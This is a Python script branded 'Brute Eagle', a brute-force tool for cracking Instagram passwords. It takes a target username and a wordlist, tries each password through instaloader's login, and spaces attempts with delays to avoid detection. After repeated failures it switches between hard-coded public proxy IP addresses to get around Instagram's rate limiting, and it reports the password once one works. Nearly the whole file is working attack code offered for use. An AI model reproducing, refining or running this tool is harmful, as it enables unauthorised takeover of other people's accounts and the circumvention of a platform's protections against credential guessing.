import requests
import os
import instaloader
from getpass import getpass
import time
import subprocess as sub
import random
from intro import *


class bcolors:
    # color codes
    BOLD = '\033[1m'
    PURPLE = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[95m'
    WARNING = '\033[93m'
    MAGENTA = '\033[95m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    UNDERLINE = '\033[4m'


start()
codeList = ["TR", "US-C", "US", "US-W", "CA", "CA-W",
            "FR", "DE", "NL", "NO", "RO", "CH", "GB", "HK"]
L = instaloader.Instaloader()
veri_break = "no"

while True:
    if veri_break == "si":
        break
    USER = ""
    USER = input(
        '\033[1m\033[92m\n[?]ENTER INSTAGRAM USERNAME FOR CRACK PASSWORD: ')
    wl = input("\n[?]Enter the PassList along The Path: ")
    sleepp = 0
    break

file1 = open(wl, 'r')
Lines = file1.readlines()
count = 0
os.system("clear")

print('''\033[95m
         _
        //
       ||              |\_/|
        \\\  .-""""-._.' - -(
         \\\/          \ =_T/=
          \    \       /`"`
           \   | /    |
           /  / -\   /
           `\ \\\  | ||     asciiart.cc
       aac   \_)) |_))


\033[0m''')
os.system('figlet -f font.flf brute eagle | lolcat')

print("")
print("\33[94m⊰᯽⊱┈──╌❊   FRAMEWORK BY TEAM ZHOI ❊╌──┈⊰᯽⊱ \t")
print("\33[94m⊰᯽⊱┈──╌❊ CODED BY > WHITE L', S74RK ❊╌──┈⊰᯽⊱ \t")

# Add proxy configuration
http_proxy = "http://10.10.1.10:3128"
https_proxy = "https://10.10.1.11:1080"
ftp_proxy = "ftp://10.10.1.10:3128"
proxyDict = {
    "http": "120.236.74.213:9002, 188.123.114.167:80, 185.82.139.1:443, 1.10.231.42:8080",
    "https": "158.69.53.98:9300, 193.201.228.121:80, 31.186.239.245:8080, 112.217.162.5:3128",
    "ftp": "36.91.166.98:8080, 188.132.222.3:8080, 188.132.221.24:8080, 185.230.48.164:32650"
}

# initialize counter and proxy switch flag
failed_attempts = 0
use_proxy = False
proxy_list = ["120.236.74.213:9002", "188.123.114.167:80", "185.82.139.1:443"]
proxy_index = 0

for line in Lines:
    try:
        PASSWORD = ""
        count += 1
        pstest = ("{}".format(line.strip()))
        PASSWORD = pstest
        choiceCode = random.choice(codeList)
        time.sleep(5) # add a delay of 5 seconds before each login attempt)
        print("\n\033[94mTrying "+pstest+"..."+bcolors.PURPLE)
        if use_proxy:
            # use proxy if flag is set
            session = requests.Session()
            session.proxies = {"http": proxy_list[proxy_index]}
            L.context._session = session
        L.login(USER, PASSWORD)
        print("\n\033[94m[✓] Password found: \033[92m"+pstest)
        veri_break = "si"
        break
    except instaloader.exceptions.BadCredentialsException:
        print(bcolors.FAIL+"\033[91m[!] Incorrect password: "+pstest)
        failed_attempts += 1
        if failed_attempts >= 9:
            # switch to using a different proxy after 9 failed attempts
            use_proxy = True
            failed_attempts = 0 # reset counter after switching to new proxy
            proxy_index = (proxy_index + 1) % len(proxy_list) # cycle through proxies in the list
            print(bcolors.WARNING +
                  "\n[!] Switching to new proxy server: " + proxy_list[proxy_index])
    except instaloader.exceptions.ConnectionException:
        print(bcolors.FAIL +
              "\n\033[91m[!] Instagram has been requested verification via sms, try to set more login time...")
        break
    except instaloader.exceptions.InvalidArgumentException:
        print(bcolors.FAIL+"\n\033[91m[☹] Username not found")

file1.close()
L.close()
print("\n\n\033[94m[✔]Brute Complete..!!")
print("[+] Thank you for using Brute Eagle Framework...Good Bye!!\n")
exit()
